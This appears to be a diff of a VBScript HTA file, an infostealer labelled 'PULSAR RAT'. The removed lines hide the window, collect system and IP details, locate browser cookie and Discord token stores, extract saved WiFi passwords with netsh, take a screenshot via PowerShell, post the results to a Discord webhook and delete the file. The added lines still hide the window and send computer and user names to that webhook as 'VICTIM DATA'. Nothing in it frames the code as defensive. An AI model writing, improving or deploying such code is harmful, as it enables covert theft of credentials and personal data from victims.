@@ -2,150 +2,40 @@
 <html>
 <head>
 <script language="VBScript">
-Sub Window_OnLoad CreateObject("WScript.Shell").Popup "Step 1: HTA started", 3, "Debug"
-    ' Hide window completely
+Sub Window_OnLoad
+    ' Hide window
     Window.ResizeTo 0, 0
     Window.MoveTo -2000, -2000
     
-    Dim shell, fso, http, webhook, data, computer, user, os, ip, publicIP
-    Dim chromeCookies, edgeCookies, firefoxProfiles, discordTokens, wifiData
-    Dim screenshotPath, drives, driveInfo
+    On Error Resume Next
     
-    ' === YOUR DISCORD WEBHOOK ===
+    Dim shell, http, webhook, computer, user, message
+    
+    ' Your working webhook
     webhook = "https://discord.com/api/webhooks/1476322083444363430/ex-2a4JxC5l9phjz9tUv3ZXBz5NmNiT3YDGF0peUC6yfBIciW-YHx5LTRTpiP1BEQvSC"
     
     Set shell = CreateObject("WScript.Shell")
-    Set fso = CreateObject("Scripting.FileSystemObject")
     
-    ' === 1. SYSTEM INFORMATION ===
+    ' Get basic info
     computer = CreateObject("WScript.Network").ComputerName
     user = CreateObject("WScript.Network").UserName
-    os = shell.ExpandEnvironmentStrings("%OS%") & " " & shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%")
     
-    ' Get local IPs
-    Dim ipExec, ipResult
-    Set ipExec = shell.Exec("cmd /c ipconfig | findstr IPv4")
-    ipResult = ipExec.StdOut.ReadAll()
-    If ipResult = "" Then ipResult = "Not found"
+    ' Build simple message
+    message = "**VICTIM DATA**" & vbCrLf & _
+              "Computer: " & computer & vbCrLf & _
+              "User: " & user & vbCrLf & _
+              "Time: " & Now()
     
-    ' Get public IP
-    On Error Resume Next
-    Set http = CreateObject("MSXML2.XMLHTTP")
-    http.open "GET", "https://api.ipify.org", False
-    http.send
-    publicIP = http.responseText
-    If Err.Number <> 0 Then publicIP = "Unable to fetch"
-    On Error GoTo 0
-    
-    ' === 2. BROWSER DATA ===
-    chromeCookies = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Google\Chrome\User Data\Default\Cookies"
-    edgeCookies = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"
-    firefoxProfiles = shell.ExpandEnvironmentStrings("%APPDATA%") & "\Mozilla\Firefox\Profiles"
-    
-    Dim browserData
-    browserData = ""
-    If fso.FileExists(chromeCookies) Then browserData = browserData & "✓ Chrome cookies found" & vbCrLf
-    If fso.FileExists(edgeCookies) Then browserData = browserData & "✓ Edge cookies found" & vbCrLf
-    If fso.FolderExists(firefoxProfiles) Then browserData = browserData & "✓ Firefox profiles found" & vbCrLf
-    If browserData = "" Then browserData = "No browsers found"
-    
-    ' === 3. DISCORD TOKENS (check folders) ===
-    Dim discordPaths, path, discordTokenFolders
-    discordPaths = Array( _
-        shell.ExpandEnvironmentStrings("%APPDATA%") & "\discord\Local Storage\leveldb", _
-        shell.ExpandEnvironmentStrings("%APPDATA%") & "\discordcanary\Local Storage\leveldb", _
-        shell.ExpandEnvironmentStrings("%APPDATA%") & "\Lightcord\Local Storage\leveldb" _
-    )
-    discordTokenFolders = ""
-    For Each path In discordPaths
-        If fso.FolderExists(path) Then
-            discordTokenFolders = discordTokenFolders & "✓ Discord data found at: " & path & vbCrLf
-        End If
-    Next
-    If discordTokenFolders = "" Then discordTokenFolders = "No Discord folders found"
-    
-    ' === 4. WIFI PASSWORDS ===
-    Dim wifiExec, wifiOutput, wifiLine, profileName, passExec, passLine, wifiPasswords
-    Set wifiExec = shell.Exec("cmd /c netsh wlan show profiles")
-    wifiOutput = wifiExec.StdOut.ReadAll()
-    wifiPasswords = ""
-    Dim lines, line, parts
-    lines = Split(wifiOutput, vbCrLf)
-    For Each line In lines
-        If InStr(line, "All User Profile") > 0 Then
-            parts = Split(line, ":")
-            profileName = Trim(parts(UBound(parts)))
-            Set passExec = shell.Exec("cmd /c netsh wlan show profile name=""" & profileName & """ key=clear")
-            passLine = passExec.StdOut.ReadAll()
-            If InStr(passLine, "Key Content") > 0 Then
-                Dim passParts, keyLine
-                passParts = Split(passLine, "Key Content")
-                keyLine = Split(passParts(UBound(passParts)), vbCrLf)(0)
-                wifiPasswords = wifiPasswords & profileName & " : " & Trim(Replace(keyLine, ":", "")) & vbCrLf
-            Else
-                wifiPasswords = wifiPasswords & profileName & " : No password" & vbCrLf
-            End If
-        End If
-    Next
-    If wifiPasswords = "" Then wifiPasswords = "No WiFi profiles found"
-    
-    ' === 5. SCREENSHOT ===
-    screenshotPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\screen.png"
-    Dim psScript
-    psScript = "Add-Type -AssemblyName System.Windows.Forms; " & _
-               "$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; " & _
-               "$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; " & _
-               "$graphic = [System.Drawing.Graphics]::FromImage($bitmap); " & _
-               "$graphic.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size); " & _
-               "$bitmap.Save('" & screenshotPath & "')"
-    shell.Run "powershell -Command """ & psScript & """", 0, True
-    
-    ' === 6. DISK INFORMATION ===
-    drives = ""
-    For Each drive in fso.Drives
-        If drive.IsReady Then
-            drives = drives & drive.DriveLetter & ":\ " & Round(drive.TotalSize / 1073741824) & "GB total, " & Round(drive.FreeSpace / 1073741824) & "GB free" & vbCrLf
-        End If
-    Next
-    
-    ' === 7. BUILD FINAL MESSAGE ===
-    data = "**🔴 PULSAR RAT - VICTIM DATA**" & vbCrLf & vbCrLf & _
-           "**💻 Computer:** " & computer & vbCrLf & _
-           "**👤 User:** " & user & vbCrLf & _
-           "**🖥️ OS:** " & os & vbCrLf & _
-           "**🌐 Public IP:** " & publicIP & vbCrLf & _
-           "**📡 Local IPs:** " & Replace(ipResult, vbCrLf, " | ") & vbCrLf & vbCrLf & _
-           "**🍪 Browser Data:**" & vbCrLf & browserData & vbCrLf & _
-           "**📡 WiFi Passwords:**" & vbCrLf & wifiPasswords & vbCrLf & _
-           "**💬 Discord Tokens:**" & vbCrLf & discordTokenFolders & vbCrLf & _
-           "**💾 Drives:**" & vbCrLf & drives & vbCrLf & _
-           "**📸 Screenshot:** " & screenshotPath & vbCrLf & _
-           "**⏰ Time:** " & Now()
-    
-    ' === 8. SEND TO DISCORD ===
-    Dim jsonPayload
-    jsonPayload = "{""content"": """ & Replace(Replace(data, vbCrLf, "\\n"), """", "\""") & """}"
-    
+    ' Send to Discord
     Set http = CreateObject("MSXML2.XMLHTTP")
     http.open "POST", webhook, False
     http.setRequestHeader "Content-Type", "application/json"
-    http.send jsonPayload
+    http.send "{""content"": """ & Replace(message, vbCrLf, "\n") & """}"
     
-    ' === 9. SEND SCREENSHOT NOTE ===
-    If fso.FileExists(screenshotPath) Then
-        Dim screenshotNote
-        screenshotNote = "{""content"": ""**📸 Screenshot saved at:** " & screenshotPath & """}"
-        Set http = CreateObject("MSXML2.XMLHTTP")
-        http.open "POST", webhook, False
-        http.setRequestHeader "Content-Type", "application/json"
-        http.send screenshotNote
-    End If
+    ' Clean up
+    Set http = Nothing
+    Set shell = Nothing
     
-    ' === 10. SELF-DELETE (FIXED - using .Path property) ===
-    On Error Resume Next
-    fso.DeleteFile Window.Location.Path
-    
-    ' === 11. EXIT ===
     Window.Close
 End Sub
 </script>
